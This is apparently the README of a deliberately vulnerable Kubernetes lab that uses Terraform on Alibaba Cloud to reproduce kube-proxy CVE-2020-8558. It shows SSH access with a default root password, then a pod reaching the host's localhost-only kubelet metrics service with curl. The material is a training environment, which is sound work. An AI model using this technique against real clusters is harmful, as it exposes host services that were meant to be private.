# kube-proxy CVE-2020-8558 Vulnerable Environment

English | [中文](./README_CN.md)

## Description

This is a scenario used to build the kube-proxy "CVE-2020-8558" vulnerability environment.

After building the environment with Terraform, users in pod can access host's services which is bind on only "127.0.0.1" address.

## Deployment Environment

Execute the following command in the container

```shell
cd /TerraformGoat/kubernetes/kubelet/log-mount
```

Configure Alibaba Cloud Access Credentials

```shell
export ALICLOUD_ACCESS_KEY="LTAI5tFkmNGXXXXXXXXX"
export ALICLOUD_SECRET_KEY="ORBs2lulAHDXXXXXXXXX"
export ALICLOUD_REGION="cn-hongkong"
```

> You can create and view your AccessKey on the [AccessKey page](https://ram.console.aliyun.com/manage/ak) of the Alibaba Cloud console

Deploy Vulnerable Environment

```shell
terraform init
terraform apply
```

> When the terminal prompts `Enter a value:`, enter `yes`

![img](../../../images/20220622-174141.jpg)

After the environment is set up, You can see the kubelet api access address of the scenario at Outputs.

## Vulnerability Utilization

first, we need to log in node host via ssh, the default password is "Huoxian@123"

```shell
➜  ~ ssh root@8.210.237.96  // 8.210.237.96 is node ip, you need replace it with what is in above "Outputs"
```

then, we can log in pod which have been created

```shell
root@iZj6ce4bmwc11otulk7i3rZ:~# kubectl exec -ti test-pod -- sh      // test-pod is pod name
sh-4.2#
```

now, we can access host's services which is bind on only "127.0.0.1" address.

```shell
root@iZj6ce4bmwc11otulk7i3rZ:~# netstat -antp|grep 127.0.0.1
tcp        0      0 127.0.0.1:37953         0.0.0.0:*               LISTEN      2551/containerd
tcp        0      0 127.0.0.1:41351         0.0.0.0:*               LISTEN      15900/kubelet
tcp        0      0 127.0.0.1:10248         0.0.0.0:*               LISTEN      15900/kubelet
...
```

for example，we can access host's kubelet metrics service in pod.

```shell
sh-4.2# curl 127.0.0.1:10249/metrics --interface eth0
# HELP apiserver_audit_event_total [ALPHA] Counter of audit events generated and sent to the audit backend.
# TYPE apiserver_audit_event_total counter
apiserver_audit_event_total 0
...
```

## Destroy the environment

```shell
terraform destroy
```
